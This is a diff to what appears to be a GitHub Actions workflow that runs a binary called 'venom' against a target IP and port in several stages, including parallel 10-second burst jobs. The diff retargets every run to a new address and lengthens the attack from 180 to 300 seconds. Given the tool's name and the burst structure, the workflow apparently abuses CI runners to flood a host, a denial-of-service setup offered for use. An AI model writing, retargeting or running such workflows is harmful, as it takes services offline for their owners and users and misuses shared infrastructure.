@@ -11,7 +11,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x venom
-      - run: ./venom 34.0.13.174 18426 180 999
+      - run: ./venom 20.204.88.80 14086 300 1983
 
   stage-1:
     needs: stage-0
@@ -22,7 +22,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x venom
-      - run: ./venom 34.0.13.174 18426 180 999
+      - run: ./venom 20.204.88.80 14086 300 1983
 
   stage-2-calc:
     runs-on: ubuntu-latest
@@ -32,7 +32,7 @@ jobs:
       - id: calc
         run: |
           
-          NUM_JOBS=$((180 / 10))
+          NUM_JOBS=$((300 / 10))
           
           ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
           echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT
@@ -49,4 +49,4 @@ jobs:
       - name: Sequential 10s Burst
         run: |
           chmod +x venom
-          ./venom 34.0.13.174 18426 180 999
+          ./venom 20.204.88.80 14086 300 1983
